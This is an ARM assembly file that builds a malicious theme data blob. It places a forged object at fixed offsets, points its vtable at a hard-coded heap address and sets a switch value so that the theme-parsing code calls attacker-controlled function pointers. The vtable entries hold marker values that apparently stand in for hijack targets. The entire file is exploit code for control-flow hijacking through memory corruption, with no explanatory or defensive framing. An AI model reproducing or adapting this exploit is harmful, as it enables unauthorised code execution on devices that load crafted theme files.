.arm
.section .init
.global _start

@ This is the start of the decompressed theme data.

#define HEAPBUF 0x35052080

_start:

themeheader:
.word 1 @ version

.space ((themeheader + 0xc4) - .)

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word 0
.word 0 @ Memchunk-hdr stuff writes here.
.word 0

.space ((object + 0x5c) - .)
.word 0x3 @ Used for the switch statement in the function which calls vtable funcptrs from this object. This value has to be at least 0x3 otherwise that function immediately returns.

.space ((object + 0x100) - .)

vtable:
.word 0x50504f52, 0x50504f53, 0x50504f54, 0x50504f55, 0x50504f56 @ vtable+0

.word 0x58584148, 0x58584149, 0x5858414a, 0x5858414b, 0x5858414c, 0x5858414d, 0x5858414e

.space ((vtable + 0x100) - .)

